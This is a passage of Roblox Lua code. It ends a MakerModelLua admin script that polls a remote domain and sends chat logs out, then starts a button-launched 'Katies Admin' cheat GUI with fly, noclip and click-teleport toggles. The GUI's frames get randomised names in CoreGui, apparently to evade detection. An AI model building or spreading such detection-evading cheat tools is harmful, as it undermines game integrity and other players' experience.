				Player:WaitForChild("PlayerGui"):WaitForChild("Output")
			end
			CORE:ExecuteResource("ClientLog", Player:WaitForChild("Backpack"), {["Admin"] = script})
			print("Executed ClientLog on "..Player.Name)
			if Settings.EnableTaskBar then
				GUI:SendChat(Player, "This place uses MakerModelLua's admin. Your rank is "..Rank..". Say "..Settings.Prefix.."cmds for commands.")
			end
		end)()
		
		coroutine.wrap(function()
			wait(7)
			Player:WaitForChild("PlayerGui")
			if IsSB == false and Player.UserId == game.CreatorId and not Server.MPS:PlayerOwnsAsset(Player, AdminID) then
				local Answer = GUI:PromptMessageWithButtons(Player, "Message from MakerModelLua's Admin", AdminInfo, "Admin", {"Ok", "No thanks"})
				if Answer == "Ok" then
					MARKET:PromptPurchase(Player, AdminID)
				end
			end
		end)()
	end
end)() end

-- Active stuff --

CORE:UpdateAdmin()
CORE:FixSettings()

ypcall(function()
	if not Server.Data:GetDataStore("MML's Admin"):GetAsync("Players") then
		Server.Data:GetDataStore("MML's Admin"):SetAsync("Players", {})
	end
end)


Server.MPS.PromptPurchaseFinished:connect(function(Player, ID, Purchased) if Purchased then
	local PlayerAdmin, Rank = RANK:IsAdmin(Player)
	if PlayerAdmin == false then
		if ID == Settings.VIPAdminID then table.insert(Settings.Ranks["Admin"], Player.Name) Rank = "Admin" GUI:TellAdmin(Player, Rank)
		elseif ID == Settings.VIPMemberID then table.insert(Settings.Ranks["Member"], Player.Name) Rank = "Member" GUI:TellAdmin(Player, Rank) end
	end
end end)

--[[
ExecuteCommand.OnInvoke = function(Player, Command)
	if Player and Command then
		if type(Player) == "userdata" and Player:IsA("Player") then
			CORE:Chatted(Command, Player, true)
		end
	end
end

ExecuteCode.OnInvoke = function(Source, Speaker)
	if type(Source) == "string" then
		ExecuteSafe(Source, Speaker)
	end
end

ExecuteCommandClient.OnServerInvoke = function(Player, Command)
	if Player and Command then
		if type(Player) == "userdata" and Player:IsA("Player") then
			CORE:Chatted(Command, Player, true)
		end
	end
end
]]








for _,Player in pairs(Server.Players:GetPlayers()) do CORE:Start(Player) end
Server.Players.PlayerAdded:connect(function(Player) Server.Players:WaitForChild(Player.Name) wait() CORE:Start(Player) end) Begin()
Server.Players.PlayerRemoving:connect(function(Player) for _,Obj in pairs(List) do if Obj == Player.UserId then for Ind,Name in pairs(Settings.Ranks.Owner) do if Player.Name == Name then table.remove(Settings.Ranks.Owner, Ind) end end end end end)

coroutine.wrap(function()
	for _,ID in pairs(Icons) do
		game:GetService("ContentProvider"):Preload("rbxassetid://"..ID)
	end
end)()

CORE:SetAbuseCommands()

coroutine.wrap(function() SOUND:SyncSoundList() end)()
if not IsStudio then coroutine.wrap(function()
	if Settings.EnableAdminMenu then Workspace.AllowThirdPartySales = true end
	REMOTE:GetRemoteData(true)
	REMOTE:CheckTrelloInfo()
	coroutine.wrap(function()
		if ypcall(function() return REMOTE:GetURL(CORE.Domain) end) then
			REMOTE.RemoteConnection = true
		end
	end)()
	coroutine.wrap(function() IRC:ConnectToServer(Settings.IRCServer) end)()
	coroutine.wrap(function()
		if Settings.LinkedAccount ~= "" then
			local Request = nil
			ypcall(function() Request = REMOTE:Decode(REMOTE:GetURL(CORE.Domain.."/Login/GetUserData.php?Username="..Settings.LinkedAccount)) end)
			if Request then
				REMOTE:HandleRequest(Request, true)
			end
		end
	end)()
	coroutine.wrap(function()
		wait(RemoteData.RemoteAdminWait)
		while REMOTE:GetAndSetWebData() do
			wait(RemoteData.RemoteAdminWait)
		end
	end)()
	coroutine.wrap(function()
		while wait(60) do
			REMOTE:GetRemoteData(true)
			REMOTE:CheckTrelloInfo()
		end
	end)()
end)() end
coroutine.wrap(function()
	if Settings.TrelloToken ~= "" then
		ypcall(function() Trello.RequiredLists = REMOTE:Decode(Server.HS:GetAsync("https://api.trello.com/1/boards/"..Trello.AdminBoardID.."/lists", true)) end)
		if #Trello.RequiredLists > 0 then
			Trello.MainBoard = REMOTE:TrelloGetAdminBoard()
			if Trello.MainBoard.name then
				local Lists = REMOTE:TrelloGetAdminLists(Trello.MainBoard)
				REMOTE:TrelloCacheData(Lists)
				REMOTE:TrelloHandleData(true)
				coroutine.wrap(function()
					wait(RemoteData.TrelloWait)
					while REMOTE:TrelloHandleData() do
						wait(RemoteData.TrelloWait)
					end
				end)()
			end
		end
	else
		print("If you would like M".."akerModelLu".."a's Admin V3 to use trello, make sure HttpEnabled is true and authorize using this link: \nhttps://trello.com/1/authorize?key=c01fcfabf2f8d707d01fb69312e4a9d7&name=MakerModelLua%27s+Admin+V3&expiration=never&response_type=token&scope=read,write\nCopy the token given when authorized and paste into 'TrelloToken' in the settings")
	end
end)()
coroutine.wrap(function() while wait(RemoteData.ChatLogWait) do
	REMOTE:SendChatLog()
end end)()
coroutine.wrap(function() while true do
	local ThisDate = REMOTE:GetURL("http://www.timeapi.org/utc/now?%5cm%2f%5cd%2f%5cY")
	if ThisDate then Date = ThisDate end
	wait(600)
end end)()

print("MakerModelLua's Admin Commands V"..CORE.Version.Value.." Loaded")
end)

b:Button("Admin",function()
   Qver = '2.1'
game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text = "Welcome To Katies Admin cmds!",
	Color = Color3.new(0, 1, 1)
})
repeat wait() until game:FindFirstChildOfClass("Players")
Players = game:GetService("Players")
repeat wait() until Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")

local Holder = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Dark = Instance.new("Frame")
local Cmdbar = Instance.new("TextBox")
local Dark_2 = Instance.new("Frame")
local CMDsF = Instance.new("ScrollingFrame")
local SettingsButton = Instance.new("ImageButton")
local Settings = Instance.new("Frame")
local Prefix = Instance.new("TextLabel")
local PrefixBox = Instance.new("TextBox")
local Keybinds = Instance.new("TextLabel")
local Select = Instance.new("TextButton")
local StayOpen = Instance.new("TextLabel")
local Button = Instance.new("Frame")
local On = Instance.new("TextButton")
local Positions = Instance.new("TextLabel")
local Select_8 = Instance.new("TextButton")
local Color = Instance.new("TextLabel")
local Select_2 = Instance.new("TextButton")
local Plugins = Instance.new("TextLabel")
local Select_9 = Instance.new("TextButton")
local Example = Instance.new("TextButton")
local Notification = Instance.new("Frame")
local Dark_3 = Instance.new("Frame")
local Title_2 = Instance.new("TextLabel")
local Text_2 = Instance.new("TextLabel")
local CloseButton = Instance.new("ImageButton")
local IntroBackground = Instance.new("Frame")
local Logo = Instance.new("ImageLabel")
local Credits = Instance.new("TextBox")
local KeybindsFrame = Instance.new("Frame")
local Close = Instance.new("TextButton")
local Add = Instance.new("TextButton")
local Delete = Instance.new("TextButton")
local Holder_2 = Instance.new("ScrollingFrame")
local Example_2 = Instance.new("Frame")
local Text_3 = Instance.new("TextLabel")
local Delete_2 = Instance.new("TextButton")
local KeybindEditor = Instance.new("Frame")
local background_2 = Instance.new("Frame")
local Dark_4 = Instance.new("Frame")
local Directions = Instance.new("TextLabel")
local BindTo = Instance.new("TextButton")
local Add_2 = Instance.new("TextButton")
local Cmdbar_2 = Instance.new("TextBox")
local Toggles = Instance.new("ScrollingFrame")
local Fly = Instance.new("TextLabel")
local Select_3 = Instance.new("TextButton")
local Noclip = Instance.new("TextLabel")
local Select_4 = Instance.new("TextButton")
local Float = Instance.new("TextLabel")
local Select_5 = Instance.new("TextButton")
local ClickTP = Instance.new("TextLabel")
local Select_6 = Instance.new("TextButton")
local Dark_7 = Instance.new("Frame")
local shadow_2 = Instance.new("Frame")
local PopupText_2 = Instance.new("TextLabel")
local Exit_2 = Instance.new("ImageButton")
local PositionsFrame = Instance.new("Frame")
local Close_3 = Instance.new("TextButton")
local Delete_5 = Instance.new("TextButton")
local Holder_4 = Instance.new("ScrollingFrame")
local Example_4 = Instance.new("Frame")
local Text_5 = Instance.new("TextLabel")
local Delete_6 = Instance.new("TextButton")
local TP = Instance.new("TextButton")
local AliasesFrame = Instance.new("Frame")
local Close_2 = Instance.new("TextButton")
local Delete_3 = Instance.new("TextButton")
local Holder_3 = Instance.new("ScrollingFrame")
local Example_3 = Instance.new("Frame")
local Text_4 = Instance.new("TextLabel")
local Delete_4 = Instance.new("TextButton")
local Aliases = Instance.new("TextLabel")
local Select_7 = Instance.new("TextButton")
local PluginsFrame = Instance.new("Frame")
local Close_4 = Instance.new("TextButton")
local Add_3 = Instance.new("TextButton")
local Holder_5 = Instance.new("ScrollingFrame")
local Example_5 = Instance.new("Frame")
local Text_6 = Instance.new("TextLabel")
local Delete_7 = Instance.new("TextButton")
local PluginEditor = Instance.new("Frame")
local background_3 = Instance.new("Frame")
local Dark_8 = Instance.new("Frame")
local Dark_9 = Instance.new("Frame")
local Img = Instance.new("ImageButton")
local AddPlugin = Instance.new("TextButton")
local FileName = Instance.new("TextBox")
local About = Instance.new("TextLabel")
local Directions_2 = Instance.new("TextLabel")
local shadow_3 = Instance.new("Frame")
local PopupText_3 = Instance.new("TextLabel")
local Exit_3 = Instance.new("ImageButton")
local logsDrag = Instance.new("Frame")
local shadow = Instance.new("Frame")
local Hide = Instance.new("ImageButton")
local PopupText = Instance.new("TextLabel")
local Exit = Instance.new("ImageButton")
local scroll = Instance.new("ScrollingFrame")
local background = Instance.new("Frame")
local Dark_6 = Instance.new("Frame")
local Clear = Instance.new("TextButton")
local Toggle = Instance.new("TextButton")

local PARENT
if game:GetService("CoreGui"):FindFirstChild('RobloxGui') then
	PARENT = game:GetService("CoreGui").RobloxGui
else
	PARENT = game:GetService("CoreGui")
end

function randomString()
	local length = math.random(10,20)
	local array = {}
	for i = 1, length do
		array[i] = string.char(math.random(32, 126))
	end
	return table.concat(array)
end

Holder.Name = randomString()
Holder.Parent = PARENT
Holder.Active = true
Holder.BackgroundColor3 = Color3.new(63, 63, 63)
Holder.BackgroundTransparency = 0.20000000298023
Holder.BorderSizePixel = 0
Holder.Position = UDim2.new(1, -250, 1, -220)
Holder.Size = UDim2.new(0, 250, 0, 220)

Title.Name = "Title"
Title.Parent = Holder
Title.BackgroundColor3 = Color3.new(63, 63, 63)
Title.BackgroundTransparency = 1
Title.BorderSizePixel = 0
Title.Size = UDim2.new(0, 250, 0, 20)
Title.Font = Enum.Font.SourceSans
Title.TextSize = 20
Title.Text = "Katies Admin V2.1"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextStrokeTransparency = 0

Dark.Name = "Dark"
Dark.Parent = Holder
Dark.Active = true
Dark.BackgroundColor3 = Color3.new(63, 63, 63)
Dark.BorderSizePixel = 0
Dark.Position = UDim2.new(0, 0, 0, 45)
Dark.Size = UDim2.new(0, 250, 0, 175)

Cmdbar.Name = "Cmdbar"
Cmdbar.Parent = Holder
Cmdbar.BackgroundColor3 = Color3.new(63, 63, 63)
Cmdbar.BackgroundTransparency = 1
Cmdbar.BorderSizePixel = 0
Cmdbar.Position = UDim2.new(0, 0, 0, 25)
Cmdbar.Size = UDim2.new(0, 250, 0, 20)
Cmdbar.Font = Enum.Font.SourceSans
Cmdbar.FontSize = Enum.FontSize.Size18
Cmdbar.Text = "Chocalate Bar"
Cmdbar.TextColor3 = Color3.new(1, 1, 1)
Cmdbar.TextScaled = true
Cmdbar.TextWrapped = true
Cmdbar.TextStrokeTransparency = 0

Dark_2.Name = "Dark"
Dark_2.Parent = Holder
Dark_2.Active = true
Dark_2.BackgroundColor3 = Color3.new(63, 63, 63)
Dark_2.BorderSizePixel = 0
Dark_2.Position = UDim2.new(0, 0, 0, 20)
Dark_2.Size = UDim2.new(0, 250, 0, 5)

CMDsF.Name = "CMDs"
CMDsF.Parent = Holder
CMDsF.BackgroundColor3 = Color3.new(63, 63, 63)
CMDsF.BackgroundTransparency = 1
CMDsF.BorderSizePixel = 0
CMDsF.Position = UDim2.new(0, 0, 0, 50)
CMDsF.Size = UDim2.new(0, 250, 0, 170)
CMDsF.BottomImage = "rbxasset://textures/blackBkg_square.png"
CMDsF.CanvasSize = UDim2.new(0, 0, 0, 0)
CMDsF.MidImage = "rbxasset://textures/blackBkg_square.png"
CMDsF.ScrollBarThickness = 8
CMDsF.TopImage = "rbxasset://textures/blackBkg_square.png"

SettingsButton.Name = "SettingsButton"
SettingsButton.Parent = Holder
SettingsButton.BackgroundColor3 = Color3.new(1, 1, 1)
SettingsButton.BackgroundTransparency = 1
SettingsButton.Position = UDim2.new(0, 230, 0, 25)
SettingsButton.Size = UDim2.new(0, 20, 0, 20)
SettingsButton.Image = "rbxassetid://1204397029"

Settings.Name = "Settings"
Settings.Parent = Holder
Settings.Active = true
Settings.BackgroundColor3 = Color3.new(63, 63, 63)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0, 0, 0, 220)
Settings.Size = UDim2.new(0, 250, 0, 175)

Prefix.Name = "Prefix"
Prefix.Parent = Settings
Prefix.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Prefix.BackgroundTransparency = 0.5
Prefix.BorderSizePixel = 0
Prefix.Position = UDim2.new(0, 0, 0, 5)
Prefix.Size = UDim2.new(0, 250, 0, 20)
Prefix.Font = Enum.Font.SourceSans
Prefix.FontSize = Enum.FontSize.Size14
Prefix.Text = "    Prefix"
Prefix.TextColor3 = Color3.new(1, 1, 1)
Prefix.TextXAlignment = Enum.TextXAlignment.Left

PrefixBox.Name = "PrefixBox"
PrefixBox.Parent = Prefix
PrefixBox.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
PrefixBox.BorderSizePixel = 0
PrefixBox.Position = UDim2.new(0, 230, 0, 0)
PrefixBox.Size = UDim2.new(0, 20, 0, 20)
PrefixBox.Font = Enum.Font.SourceSansBold
PrefixBox.FontSize = Enum.FontSize.Size14
PrefixBox.Text = ''
PrefixBox.TextColor3 = Color3.new(0, 0, 0)

Keybinds.Name = "Keybinds"
Keybinds.Parent = Settings
Keybinds.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Keybinds.BackgroundTransparency = 0.5
Keybinds.BorderSizePixel = 0
Keybinds.Position = UDim2.new(0, 0, 0, 55)
Keybinds.Size = UDim2.new(0, 250, 0, 20)
Keybinds.Font = Enum.Font.SourceSans
Keybinds.FontSize = Enum.FontSize.Size14
Keybinds.Text = "    Keybinds"
Keybinds.TextColor3 = Color3.new(1, 1, 1)
Keybinds.TextXAlignment = Enum.TextXAlignment.Left

Select.Name = "Select"
Select.Parent = Keybinds
Select.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select.BorderSizePixel = 0
Select.Position = UDim2.new(0, 200, 0, 0)
Select.Size = UDim2.new(0, 50, 0, 20)
Select.Font = Enum.Font.SourceSans
Select.FontSize = Enum.FontSize.Size14
Select.Text = "Edit"
Select.TextColor3 = Color3.new(0, 0, 0)

Aliases.Name = "Aliases"
Aliases.Parent = Settings
Aliases.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Aliases.BackgroundTransparency = 0.5
Aliases.BorderSizePixel = 0
Aliases.Position = UDim2.new(0, 0, 0, 80)
Aliases.Size = UDim2.new(0, 250, 0, 20)
Aliases.Font = Enum.Font.SourceSans
Aliases.FontSize = Enum.FontSize.Size14
Aliases.Text = "    Aliases"
Aliases.TextColor3 = Color3.new(1, 1, 1)
Aliases.TextXAlignment = Enum.TextXAlignment.Left

Select_7.Name = "Select"
Select_7.Parent = Aliases
Select_7.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_7.BorderSizePixel = 0
Select_7.Position = UDim2.new(0, 200, 0, 0)
Select_7.Size = UDim2.new(0, 50, 0, 20)
Select_7.Font = Enum.Font.SourceSans
Select_7.FontSize = Enum.FontSize.Size14
Select_7.Text = "Edit"
Select_7.TextColor3 = Color3.new(0, 0, 0)

StayOpen.Name = "StayOpen"
StayOpen.Parent = Settings
StayOpen.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
StayOpen.BackgroundTransparency = 0.5
StayOpen.BorderSizePixel = 0
StayOpen.Position = UDim2.new(0, 0, 0, 30)
StayOpen.Size = UDim2.new(0, 250, 0, 20)
StayOpen.Font = Enum.Font.SourceSans
StayOpen.FontSize = Enum.FontSize.Size14
StayOpen.Text = "    Keep Menu Open"
StayOpen.TextColor3 = Color3.new(1, 1, 1)
StayOpen.TextXAlignment = Enum.TextXAlignment.Left

Button.Name = "Button"
Button.Parent = StayOpen
Button.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Button.BorderSizePixel = 0
Button.Position = UDim2.new(0, 230, 0, 0)
Button.Size = UDim2.new(0, 20, 0, 20)

On.Name = "On"
On.Parent = Button
On.BackgroundColor3 = Color3.new(0.8, 0.8, 0.8)
On.BackgroundTransparency = 1
On.BorderSizePixel = 0
On.Position = UDim2.new(0, 2, 0, 2)
On.Size = UDim2.new(0, 16, 0, 16)
On.Font = Enum.Font.SourceSans
On.FontSize = Enum.FontSize.Size14
On.Text = ""
On.TextColor3 = Color3.new(0, 0, 0)

Positions.Name = "Positions"
Positions.Parent = Settings
Positions.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Positions.BackgroundTransparency = 0.5
Positions.BorderSizePixel = 0
Positions.Position = UDim2.new(0, 0, 0, 105)
Positions.Size = UDim2.new(0, 250, 0, 20)
Positions.Font = Enum.Font.SourceSans
Positions.FontSize = Enum.FontSize.Size14
Positions.Text = "    Waypoints / Positions"
Positions.TextColor3 = Color3.new(1, 1, 1)
Positions.TextXAlignment = Enum.TextXAlignment.Left

Select_8.Name = "Select"
Select_8.Parent = Positions
Select_8.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_8.BorderSizePixel = 0
Select_8.Position = UDim2.new(0, 200, 0, 0)
Select_8.Size = UDim2.new(0, 50, 0, 20)
Select_8.Font = Enum.Font.SourceSans
Select_8.FontSize = Enum.FontSize.Size14
Select_8.Text = "Edit / TP"
Select_8.TextColor3 = Color3.new(0, 0, 0)

Color.Name = "Color"
Color.Parent = Settings
Color.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Color.BackgroundTransparency = 0.5
Color.BorderSizePixel = 0
Color.Position = UDim2.new(0, 0, 0, 155)
Color.Size = UDim2.new(0, 250, 0, 20)
Color.Font = Enum.Font.SourceSans
Color.FontSize = Enum.FontSize.Size14
Color.Text = "    UI Color"
Color.TextColor3 = Color3.new(1, 1, 1)
Color.TextXAlignment = Enum.TextXAlignment.Left

Select_2.Name = "Select"
Select_2.Parent = Color
Select_2.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_2.BorderSizePixel = 0
Select_2.Position = UDim2.new(0, 200, 0, 0)
Select_2.Size = UDim2.new(0, 50, 0, 20)
Select_2.Font = Enum.Font.SourceSans
Select_2.FontSize = Enum.FontSize.Size14
Select_2.Text = "Change"
Select_2.TextColor3 = Color3.new(0, 0, 0)

Plugins.Name = "Plugins"
Plugins.Parent = Settings
Plugins.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Plugins.BackgroundTransparency = 0.5
Plugins.BorderSizePixel = 0
Plugins.Position = UDim2.new(0, 0, 0, 130)
Plugins.Size = UDim2.new(0, 250, 0, 20)
Plugins.Font = Enum.Font.SourceSans
Plugins.FontSize = Enum.FontSize.Size14
Plugins.Text = "    Plugins"
Plugins.TextColor3 = Color3.new(1, 1, 1)
Plugins.TextXAlignment = Enum.TextXAlignment.Left

Select_9.Name = "Select"
Select_9.Parent = Plugins
Select_9.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_9.BorderSizePixel = 0
Select_9.Position = UDim2.new(0, 200, 0, 0)
Select_9.Size = UDim2.new(0, 50, 0, 20)
Select_9.Font = Enum.Font.SourceSans
Select_9.FontSize = Enum.FontSize.Size14
Select_9.Text = "Edit"
Select_9.TextColor3 = Color3.new(0, 0, 0)

Example.Name = "Example"
Example.Parent = Holder
Example.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Example.BackgroundTransparency = 1
Example.BorderSizePixel = 0
Example.Size = UDim2.new(0, 190, 0, 20)
Example.Visible = false
Example.Font = Enum.Font.SourceSansBold
Example.FontSize = Enum.FontSize.Size18
Example.Text = "Example"
Example.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
Example.TextStrokeTransparency = 0
Example.TextXAlignment = Enum.TextXAlignment.Left

Notification.Name = randomString()
Notification.Parent = PARENT
Notification.Active = true
Notification.BackgroundColor3 = Color3.new(255, 0,  255)
Notification.BackgroundTransparency = 0
Notification.BorderSizePixel = 0
Notification.Position = UDim2.new(1, -500, 1, 20)
Notification.Size = UDim2.new(0, 250, 0, 100)

Dark_3.Name = "Dark"
Dark_3.Parent = Notification
Dark_3.Active = true
Dark_3.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_3.BackgroundTransparency = 0.5
Dark_3.BorderSizePixel = 0
Dark_3.Position = UDim2.new(0, 0, 0, 20)
Dark_3.Size = UDim2.new(0, 250, 0, 5)

Title_2.Name = "Title"
Title_2.Parent = Notification
Title_2.BackgroundColor3 = Color3.new(255, 0,  255)
Title_2.BackgroundTransparency = 1
Title_2.BorderSizePixel = 0
Title_2.Size = UDim2.new(0, 250, 0, 20)
Title_2.Font = Enum.Font.SourceSans
Title_2.TextSize = 20
Title_2.Text = "Notification Title"
Title_2.TextColor3 = Color3.new(1, 1, 1)
Title_2.TextStrokeTransparency = 0

Text_2.Name = "Text"
Text_2.Parent = Notification
Text_2.BackgroundColor3 = Color3.new(255, 0,  255)
Text_2.BackgroundTransparency = 1
Text_2.BorderSizePixel = 0
Text_2.Position = UDim2.new(0, 5, 0, 25)
Text_2.Size = UDim2.new(0, 240, 0, 75)
Text_2.Font = Enum.Font.SourceSans
Text_2.FontSize = Enum.FontSize.Size18
Text_2.Text = "Notification Text"
Text_2.TextColor3 = Color3.new(1, 1, 1)
Text_2.TextWrapped = true

CloseButton.Name = "CloseButton"
CloseButton.Parent = Notification
CloseButton.BackgroundColor3 = Color3.new(1, 1, 1)
CloseButton.BackgroundTransparency = 1
CloseButton.Position = UDim2.new(0, 0, 0, 0)
CloseButton.Size = UDim2.new(0, 20, 0, 20)
CloseButton.Image = "rbxassetid://2132544126"

IntroBackground.Name = "IntroBackground"
IntroBackground.Parent = Holder
IntroBackground.Active = true
IntroBackground.BackgroundColor3 = Color3.new(255, 0,  255)
IntroBackground.BorderSizePixel = 0
IntroBackground.Position = UDim2.new(0, 0, 0, 45)
IntroBackground.Size = UDim2.new(0, 250, 0, 175)
IntroBackground.ZIndex = 4

Logo.Name = "Logo"
Logo.Parent = Holder
Logo.BackgroundColor3 = Color3.new(1, 1, 1)
Logo.BackgroundTransparency = 1
Logo.BorderSizePixel = 0
Logo.Position = UDim2.new(0, 125, 0, 127)
Logo.Size = UDim2.new(0, 10, 0, 10)
Logo.Image = "rbxassetid://23187053"
Logo.ImageTransparency = 0
Logo.ZIndex = 5

Credits.Name = "Credits"
Credits.Parent = Holder
Credits.BackgroundColor3 = Color3.new(1, 1, 1)
Credits.BackgroundTransparency = 1
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0, 0, 0.9, 30)
Credits.Size = UDim2.new(0, 250, 0, 20)
Credits.Font = Enum.Font.SourceSansLight
Credits.FontSize = Enum.FontSize.Size18
Credits.Text = "Katie // Zombie"
Credits.TextColor3 = Color3.new(1, 1, 1)
Credits.ZIndex = 5

KeybindsFrame.Name = "KeybindsFrame"
KeybindsFrame.Parent = Settings
KeybindsFrame.Active = true
KeybindsFrame.BackgroundColor3 = Color3.new(255, 0,  255)
KeybindsFrame.BorderSizePixel = 0
KeybindsFrame.Position = UDim2.new(0, 0, 0, 175)
KeybindsFrame.Size = UDim2.new(0, 250, 0, 175)

Close.Name = "Close"
Close.Parent = KeybindsFrame
Close.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0, 205, 0, 150)
Close.Size = UDim2.new(0, 40, 0, 20)
Close.Font = Enum.Font.SourceSans
Close.FontSize = Enum.FontSize.Size14
Close.Text = "Close"
Close.TextColor3 = Color3.new(0, 0, 0)

Add.Name = "Add"
Add.Parent = KeybindsFrame
Add.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Add.BorderSizePixel = 0
Add.Position = UDim2.new(0, 5, 0, 150)
Add.Size = UDim2.new(0, 40, 0, 20)
Add.Font = Enum.Font.SourceSans
Add.FontSize = Enum.FontSize.Size14
Add.Text = "Add"
Add.TextColor3 = Color3.new(0, 0, 0)

Delete.Name = "Delete"
Delete.Parent = KeybindsFrame
Delete.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete.BorderSizePixel = 0
Delete.Position = UDim2.new(0, 50, 0, 150)
Delete.Size = UDim2.new(0, 40, 0, 20)
Delete.Font = Enum.Font.SourceSans
Delete.FontSize = Enum.FontSize.Size14
Delete.Text = "Clear"
Delete.TextColor3 = Color3.new(0, 0, 0)

Holder_2.Name = "Holder"
Holder_2.Parent = KeybindsFrame
Holder_2.BackgroundColor3 = Color3.new(255, 0,  255)
Holder_2.BackgroundTransparency = 1
Holder_2.BorderSizePixel = 0
Holder_2.Position = UDim2.new(0, 0, 0, 0)
Holder_2.Size = UDim2.new(0, 250, 0, 145)
Holder_2.BottomImage = "rbxasset://textures/blackBkg_square.png"
Holder_2.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_2.MidImage = "rbxasset://textures/blackBkg_square.png"
Holder_2.ScrollBarThickness = 0
Holder_2.TopImage = "rbxasset://textures/blackBkg_square.png"

Example_2.Name = "Example"
Example_2.Parent = KeybindsFrame
Example_2.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Example_2.BackgroundTransparency = 0.5
Example_2.BorderSizePixel = 0
Example_2.Size = UDim2.new(0, 10, 0, 20)
Example_2.Visible = false

Text_3.Name = "Text"
Text_3.Parent = Example_2
Text_3.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Text_3.BackgroundTransparency = 0.5
Text_3.BorderSizePixel = 0
Text_3.Position = UDim2.new(0, 10, 0, 0)
Text_3.Size = UDim2.new(0, 240, 0, 20)
Text_3.Font = Enum.Font.SourceSans
Text_3.FontSize = Enum.FontSize.Size14
Text_3.Text = "nom"
Text_3.TextColor3 = Color3.new(1, 1, 1)
Text_3.TextXAlignment = Enum.TextXAlignment.Left

Delete_2.Name = "Delete"
Delete_2.Parent = Text_3
Delete_2.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_2.BorderSizePixel = 0
Delete_2.Position = UDim2.new(0, 200, 0, 0)
Delete_2.Size = UDim2.new(0, 40, 0, 20)
Delete_2.Font = Enum.Font.SourceSans
Delete_2.FontSize = Enum.FontSize.Size14
Delete_2.Text = "Delete"
Delete_2.TextColor3 = Color3.new(0, 0, 0)

KeybindEditor.Name = randomString()
KeybindEditor.Parent = PARENT
KeybindEditor.Active = true
KeybindEditor.BackgroundColor3 = Color3.new(1, 1, 1)
KeybindEditor.BackgroundTransparency = 1
KeybindEditor.Position = UDim2.new(0.5, -180, 0, -400)
KeybindEditor.Size = UDim2.new(0, 360, 0, 20)
KeybindEditor.ZIndex = 4

background_2.Name = "background"
background_2.Parent = KeybindEditor
background_2.BackgroundColor3 = Color3.new(255, 0,  255)
background_2.BorderSizePixel = 0
background_2.Position = UDim2.new(0, 0, 0, 20)
background_2.Size = UDim2.new(0, 360, 0, 160)

Dark_4.Name = "Dark"
Dark_4.Parent = background_2
Dark_4.Active = true
Dark_4.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_4.BackgroundTransparency = 0.5
Dark_4.BorderSizePixel = 0
Dark_4.Position = UDim2.new(0, 135, 0, 5)
Dark_4.Size = UDim2.new(0, 5, 0, 155)

Directions.Name = "Directions"
Directions.Parent = background_2
Directions.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Directions.BackgroundTransparency = 1
Directions.BorderSizePixel = 0
Directions.Position = UDim2.new(0, 10, 0, 15)
Directions.Size = UDim2.new(0, 115, 0, 90)
Directions.Font = Enum.Font.SourceSansBold
Directions.FontSize = Enum.FontSize.Size14
Directions.Text = "Click the button below and press a key/mouse button. Then select what you want to bind it to."
Directions.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
Directions.TextStrokeTransparency = 0
Directions.TextWrapped = true
Directions.TextYAlignment = Enum.TextYAlignment.Top

BindTo.Name = "BindTo"
BindTo.Parent = background_2
BindTo.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
BindTo.BackgroundTransparency = 0.5
BindTo.BorderSizePixel = 0
BindTo.Position = UDim2.new(0, 10, 0, 95)
BindTo.Size = UDim2.new(0, 115, 0, 50)
BindTo.Font = Enum.Font.SourceSans
BindTo.FontSize = Enum.FontSize.Size18
BindTo.Text = "Click to bind"
BindTo.TextColor3 = Color3.new(1, 1, 1)
BindTo.TextStrokeTransparency = 0

Add_2.Name = "Add"
Add_2.Parent = background_2
Add_2.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Add_2.BackgroundTransparency = 0.5
Add_2.BorderSizePixel = 0
Add_2.Position = UDim2.new(0, 310, 0, 20)
Add_2.Size = UDim2.new(0, 40, 0, 20)
Add_2.Font = Enum.Font.SourceSans
Add_2.FontSize = Enum.FontSize.Size18
Add_2.Text = "Add"
Add_2.TextColor3 = Color3.new(1, 1, 1)
Add_2.TextStrokeTransparency = 0

Cmdbar_2.Name = "Cmdbar"
Cmdbar_2.Parent = background_2
Cmdbar_2.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Cmdbar_2.BackgroundTransparency = 0.5
Cmdbar_2.BorderSizePixel = 0
Cmdbar_2.Position = UDim2.new(0, 150, 0, 20)
